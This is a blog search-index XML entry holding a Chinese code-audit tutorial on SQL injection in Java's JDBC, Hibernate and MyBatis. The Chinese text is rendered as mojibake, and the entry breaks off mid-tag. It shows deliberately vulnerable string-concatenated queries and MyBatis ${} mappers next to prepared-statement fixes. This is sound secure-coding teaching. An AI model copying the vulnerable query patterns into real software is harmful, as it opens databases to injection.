<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Javaä»£å®¡--Sqlæ³¨å…¥</title>
      <link href="/2023/10/21/Java%E4%BB%A3%E5%AE%A1--Sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/10/21/Java%E4%BB%A3%E5%AE%A1--Sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaä¸­çš„æ•°æ®åº“æ“ä½œ"><a href="#Javaä¸­çš„æ•°æ®åº“æ“ä½œ" class="headerlink" title="Javaä¸­çš„æ•°æ®åº“æ“ä½œ"></a>Javaä¸­çš„æ•°æ®åº“æ“ä½œ</h1><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="æ•°æ®åº“è¿æ¥"><a href="#æ•°æ®åº“è¿æ¥" class="headerlink" title="æ•°æ®åº“è¿æ¥"></a>æ•°æ®åº“è¿æ¥</h3><p>åŸå§‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line"><span class="comment">//æ­£ç¡®è®¾ç½®æ—¶åŒºï¼Œå¦åˆ™ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&amp;serverTimezone=UTC&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line">Class.forName(CLASS_NAME);<span class="comment">// æ³¨å†ŒJDBCé©±åŠ¨ç±»</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure><p>Datasource</p><blockquote><p>ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJava ä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡ TCP è¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡ JDBC æ¥å£æ¥è®¿é—®ï¼Œè€Œ JDBC æ¥å£åˆ™é€šè¿‡ JDBC é©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p></blockquote><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">123</span></span><br><span class="line"><span class="attr">spring.datasource.type</span>=<span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢å‡½æ•°"><a href="#æŸ¥è¯¢å‡½æ•°" class="headerlink" title="æŸ¥è¯¢å‡½æ•°"></a>æŸ¥è¯¢å‡½æ•°</h3><h4 id="statement-executeQuery"><a href="#statement-executeQuery" class="headerlink" title="statement.executeQuery()"></a>statement.executeQuery()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231020230554466.png" alt="image-20231020230554466"></p><h4 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h4><p>PrepareStatementä¼šå¯¹SQLè¯­å¥è¿›è¡Œ<strong>é¢„ç¼–è¯‘</strong></p><p>ä¼ å‚<code>&#39;admin</code>â€˜</p><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>é¢„ç¼–è¯‘ä¼šå¯¹ä¼ å…¥çš„å‚æ•°è‡ªåŠ¨<strong>åŠ ä¸Šä¸€å¯¹å•å¼•å·</strong>ï¼Œå¹¶å¯¹å‚æ•°å€¼è¿›è¡Œ<strong>è½¬ä¹‰æ“ä½œ</strong></p><h3 id="é¢„ç¼–è¯‘ä½¿ç”¨"><a href="#é¢„ç¼–è¯‘ä½¿ç”¨" class="headerlink" title="é¢„ç¼–è¯‘ä½¿ç”¨"></a>é¢„ç¼–è¯‘ä½¿ç”¨</h3><ul><li><p>å•ä¸ªå‚æ•°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql=<span class="string">&quot;select * from user where name=?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="number">1</span>,username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure></li><li><p>inè¯­å¥</p><p>åœ¨inå½“ä¸­ä½¿ç”¨æ‹¼æ¥è€Œä¸ä½¿ç”¨å ä½ç¬¦åšé¢„ç¼–è¯‘çš„åŸå› æ˜¯å› ä¸ºå¾ˆå¤šæ—¶å€™æ— æ³•ç¡®å®šèŒƒå›´é‡Œå«æœ‰å¤šå°‘ä¸ªå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">gradeDelete</span><span class="params">(Connection con, String delIds)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">num</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//å°†å¯¹è±¡åˆ†å‰²å¼€æ¥,æ ¹æ®å®é™…ä¼ å‚æƒ…å†µè¿›è¡Œåˆ†å‰²</span></span><br><span class="line">    String[] spl = delIds.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ ¹æ®å¯¹è±¡çš„ä¸ªæ•°æ·»åŠ åŒé‡çš„å ä½ç¬¦?,ç”¨æ¥é¢„ç¼–è¯‘</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt; spl.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">            num += <span class="string">&quot;?&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            num += <span class="string">&quot;.?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;delete from users where id in(&quot;</span>+num+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="type">prepareStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; spl.length; j++)&#123;</span><br><span class="line">            pstmt.setInt(j+<span class="number">1</span>, integer.parseint(spl[j]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pstmt.executeUpdate();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>likeè¯­å¥</p><p><strong>æ­£ç¡®çš„å†™æ³•</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users like ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="string">&quot;txf&quot;</span>,<span class="string">&quot;%&quot;</span>+username+<span class="string">&quot;%&quot;</span>);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line">    </span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users like concat(&#x27;%&#x27;,?,&#x27;%&#x27;)&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="string">&quot;txf&quot;</span>,username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021103743908.png" alt="image-20231021103743908"></p><p><strong>é”™è¯¯çš„å†™æ³•</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users like %?%&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">statement.setString(<span class="number">1</span>,username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021103421175.png" alt="image-20231021103421175"></p></li></ul><p>å½“ç„¶å¯¹äº<code>order by</code>è¿™ç§ä½¿ç”¨äº†é¢„ç¼–è¯‘ä¼šå¯¼è‡´Sqlè¯­å¥å¤±æ•ˆçš„åœ°æ–¹ï¼Œè¿˜æ˜¯éœ€è¦æ‰‹åŠ¨å†™é»‘ç™½åå•çš„è¿‡æ»¤æ‰å¯ä»¥ã€‚</p><h2 id="Hibernateæ¡†æ¶"><a href="#Hibernateæ¡†æ¶" class="headerlink" title="Hibernateæ¡†æ¶"></a>Hibernateæ¡†æ¶</h2><blockquote><p>Hibernateæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„å¯¹è±¡å…³ç³»æ˜ å°„æ¡†æ¶ï¼Œå®ƒå¯¹JDBCè¿›è¡Œäº†éå¸¸è½»é‡çº§çš„å¯¹è±¡å°è£…ï¼Œä½¿å¾—Javaç¨‹åºå‘˜å¯ä»¥éšå¿ƒæ‰€æ¬²çš„ä½¿ç”¨å¯¹è±¡ç¼–ç¨‹æ€ç»´æ¥æ“çºµæ•°æ®åº“ã€‚</p><p>Hibernateå¯ä»¥ä½¿ç”¨hqlæ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œæ— è®ºæ˜¯å“ªç§æ–¹å¼éƒ½æœ‰å¯èƒ½å¯¼è‡´SQLæ³¨å…¥</p></blockquote><h3 id="SqlæŸ¥è¯¢"><a href="#SqlæŸ¥è¯¢" class="headerlink" title="SqlæŸ¥è¯¢"></a>SqlæŸ¥è¯¢</h3><p><strong>HQLè¯­å¥</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> <span class="string">&quot;from People where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Query</span> <span class="variable">query</span> <span class="operator">=</span> session.createQuery(hql);</span><br><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> query.list();</span><br><span class="line">System.out.println(list);</span><br></pre></td></tr></table></figure><p><strong>Sqlè¯­å¥</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Query&lt;People&gt; query = session.createNativeQuery(<span class="string">&quot;select * from user where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="é¢„ç¼–è¯‘ä½¿ç”¨-1"><a href="#é¢„ç¼–è¯‘ä½¿ç”¨-1" class="headerlink" title="é¢„ç¼–è¯‘ä½¿ç”¨"></a>é¢„ç¼–è¯‘ä½¿ç”¨</h3><h4 id="å‘½åå‚æ•°ï¼ˆnamed-parameter"><a href="#å‘½åå‚æ•°ï¼ˆnamed-parameter" class="headerlink" title="å‘½åå‚æ•°ï¼ˆnamed parameter"></a>å‘½åå‚æ•°ï¼ˆnamed parameter</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users name = :name&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>, parameter);</span><br></pre></td></tr></table></figure><h4 id="ä½ç½®å‚æ•°ï¼ˆPositional-parameterï¼‰"><a href="#ä½ç½®å‚æ•°ï¼ˆPositional-parameterï¼‰" class="headerlink" title="ä½ç½®å‚æ•°ï¼ˆPositional parameterï¼‰"></a>ä½ç½®å‚æ•°ï¼ˆPositional parameterï¼‰</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users name = ?&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="number">0</span>, parameter);</span><br></pre></td></tr></table></figure><h4 id="å‘½åå‚æ•°åˆ—è¡¨ï¼ˆnamed-parameter-listï¼‰"><a href="#å‘½åå‚æ•°åˆ—è¡¨ï¼ˆnamed-parameter-listï¼‰" class="headerlink" title="å‘½åå‚æ•°åˆ—è¡¨ï¼ˆnamed parameter listï¼‰"></a>å‘½åå‚æ•°åˆ—è¡¨ï¼ˆnamed parameter listï¼‰</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;222&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users where name in (:names)&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;names&quot;</span>, names);</span><br></pre></td></tr></table></figure><h4 id="ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰"><a href="#ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰" class="headerlink" title="ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰"></a>ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">user1.setName(<span class="string">&quot;khaz&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from users where name =:name&quot;</span>, User.class);</span><br><span class="line">query.setProperties(user1);</span><br></pre></td></tr></table></figure><h2 id="Mybatisæ¡†æ¶"><a href="#Mybatisæ¡†æ¶" class="headerlink" title="Mybatisæ¡†æ¶"></a>Mybatisæ¡†æ¶</h2><blockquote><p>MyBatis æ˜¯ä¸€æ¬¾ä¼˜ç§€çš„æŒä¹…å±‚æ¡†æ¶ï¼Œå®ƒæ”¯æŒè‡ªå®šä¹‰ SQLã€å­˜å‚¨è¿‡ç¨‹ä»¥åŠé«˜çº§æ˜ å°„ã€‚MyBatis å…é™¤äº†å‡ ä¹æ‰€æœ‰çš„ JDBC ä»£ç ä»¥åŠè®¾ç½®å‚æ•°å’Œè·å–ç»“æœé›†çš„å·¥ä½œã€‚MyBatis å¯ä»¥é€šè¿‡ç®€å•çš„ XML æˆ–æ³¨è§£æ¥é…ç½®å’Œæ˜ å°„åŸå§‹ç±»å‹ã€æ¥å£å’Œ Java POJOï¼ˆPlain Old Java Objectsï¼Œæ™®é€šè€å¼ Java å¯¹è±¡ï¼‰ä¸ºæ•°æ®åº“ä¸­çš„è®°å½•ã€‚</p></blockquote><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><h4 id="åŸºäºæ³¨è§£"><a href="#åŸºäºæ³¨è§£" class="headerlink" title="åŸºäºæ³¨è§£"></a>åŸºäºæ³¨è§£</h4><p><code>dao</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¦ä¹ˆåœ¨æ¯ä¸€ä¸ª<code>dao</code>ä¸ŠåŠ ä¸Š<code>@Mapper</code>ï¼Œæˆ–è€…ä¸åŠ ç„¶ååœ¨å¯åŠ¨ç±»åŠ ä¸Š<code>@MapperScan(&quot;daoæ‰€åœ¨çš„åŒ…&quot;)</code></p></blockquote><p><code>entity</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Controller</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/mybatis&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDemo</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/sql&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.queryByName(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŸºäºXML"><a href="#åŸºäºXML" class="headerlink" title="åŸºäºXML"></a>åŸºäºXML</h4><p>ä¸»è¦åŒºåˆ«åœ¨äºsqlè¯­å¥ä¸€ä¸ªæ˜¯å†™åœ¨Mapperæ³¨è§£ï¼Œä¸€ä¸ªæ˜¯å†™åœ¨XMLä¸­</p><p><code>mapper</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- namespaceå€¼ä¸ºdao --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.itheima.springbootmybatis.mapper.UserXmlMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- idå¯¹åº”æ¥å£æ–¹æ³•å resultTypeå¯¹åº”å®ä½“ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>dao</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserXmlMapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜ å°„å…³ç³»</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*Mapper.xml</span> <span class="comment"># mapperæ˜ å°„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.itheima.springbootmybatis.domain</span></span><br></pre></td></tr></table></figure><p><code>entity</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Controller</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/mybatis&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDemo</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/sql&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.queryByName(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¼ å‚æ–¹å¼"><a href="#ä¼ å‚æ–¹å¼" class="headerlink" title="ä¼ å‚æ–¹å¼"></a>ä¼ å‚æ–¹å¼</h3><p>Mybatisä¸‹æœ‰ä¸¤ç§ä¼ å‚æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯<code>$&#123;&#125;</code>ä»¥åŠ<code>#&#123;&#125;</code></p><h4 id="ä¼ å‚"><a href="#ä¼ å‚" class="headerlink" title="${}ä¼ å‚"></a><code>$&#123;&#125;</code>ä¼ å‚</h4><p>ä½¿ç”¨<code>$&#123;&#125;</code>çš„æ–¹å¼ä¼ å‚ï¼Œmybatisæ˜¯å°†ä¼ å…¥çš„å‚æ•°<strong>ç›´æ¥æ‹¼æ¥</strong>åˆ°SQLè¯­å¥ä¸Š</p><p>Mapper</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from user where name = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">queryByName</span><span class="params">(String username)</span>;</span><br></pre></td></tr></table></figure><p>Controller</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/sql&quot;)</span> Â   </span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123; Â  Â  Â   </span><br><span class="line"><span class="keyword">return</span> userMapper.queryByName(username); Â   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021133037285.png" alt="image-20231021133037285"></p><h4 id="ä¼ å‚-1"><a href="#ä¼ å‚-1" class="headerlink" title="#{}ä¼ å‚"></a><code>#&#123;&#125;</code>ä¼ å‚</h4><p>ä½¿ç”¨<code>#&#123;&#125;</code>ä¼ å‚åˆ™ç›¸å½“äºä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œç›¸å½“äº<code>?</code>å ä½ç¬¦</p><p>Mapper</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from user where name = #&#123;username&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">queryByName</span><span class="params">(String username)</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231021134416037.png" alt="image-20231021134416037"></p><p><img src="/../images/image-20231021134353209.png" alt="image-20231021134353209"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><strong>å¯èƒ½å­˜åœ¨çš„sqlæ³¨å…¥ç‚¹</strong></p><p>DAO: å­˜åœ¨æ‹¼æ¥çš„SQLè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String sql=&quot;select * from user where id=&quot;+id</span><br></pre></td></tr></table></figure><p>Hibernateæ¡†æ¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.createQuery(&quot;from Book where title like &#x27;%&quot; + userInput + &quot;%&#x27; and published = true&quot;)</span><br></pre></td></tr></table></figure><p>Mybatisæ¡†æ¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Select * from news where title like <span class="title function_">concat</span><span class="params">(<span class="string">&quot;%&quot;</span>+<span class="string">&quot;$&#123;title&#125;&quot;</span>+<span class="string">&quot;%&quot;</span>)</span></span><br><span class="line">Select * from news where id <span class="title function_">in</span> <span class="params">($&#123;id&#125;)</span>ï¼Œ</span><br><span class="line">Select * from news <span class="type">where</span> <span class="variable">title</span> <span class="operator">=</span><span class="string">&#x27;java&#x27;</span> order by $&#123;time&#125; asc</span><br></pre></td></tr></table></figure><p>âš ï¸ æ³¨æ„å¹¶ä¸æ˜¯å…¨éƒ¨çš„å‚æ•°æ‹¼æ¥éƒ½ä¼šäº§ç”Ÿæ¼æ´çš„ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µæ˜¯ä¸å­˜åœ¨SQLæ³¨å…¥çš„ï¼š</p><ul><li><p>paramä¸å¯æ§</p></li><li><p>paramä¸æ˜¯å­—ç¬¦ç±»å‹ï¼Œæ¯”å¦‚è¯´parameterä¸ºintç±»å‹ï¼Œåªèƒ½ä¼ å…¥æ•°å­—ï¼Œå°±æ²¡æ³•äº§ç”ŸSQLæ³¨å…¥</p></li><li><p>paramåœ¨ä¼ é€’è¿‡ç¨‹ä¸­è¢«è½¬ä¹‰æˆ–è¿‡æ»¤ï¼Œæ¯”å¦‚filterè¿‡æ»¤å™¨</p></li></ul><p><strong>ä¿®å¤</strong></p><ul><li>æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘,å¦‚å ä½ç¬¦é—®é¢˜ï¼ŒMybatisæ¡†æ¶ä½¿ç”¨<code>#&#123;&#125;</code></li><li>ä¸èƒ½é¢„ç¼–è¯‘çš„åœ°æ–¹å¦‚Order Byï¼Œå¯ä»¥åŠ filteræ¥è¿›è¡Œé»‘åå•è¿‡æ»¤</li></ul><h1 id="Spring-Booté¡¹ç›®æŒ–æ˜"><a href="#Spring-Booté¡¹ç›®æŒ–æ˜" class="headerlink" title="Spring Booté¡¹ç›®æŒ–æ˜"></a>Spring Booté¡¹ç›®æŒ–æ˜</h1><h2 id="è§‚å¯Ÿé¡¹ç›®ä½¿ç”¨äº†å“ªä¸€ç§æ–¹æ³•æ¥æ“ä½œæ•°æ®åº“"><a href="#è§‚å¯Ÿé¡¹ç›®ä½¿ç”¨äº†å“ªä¸€ç§æ–¹æ³•æ¥æ“ä½œæ•°æ®åº“" class="headerlink" 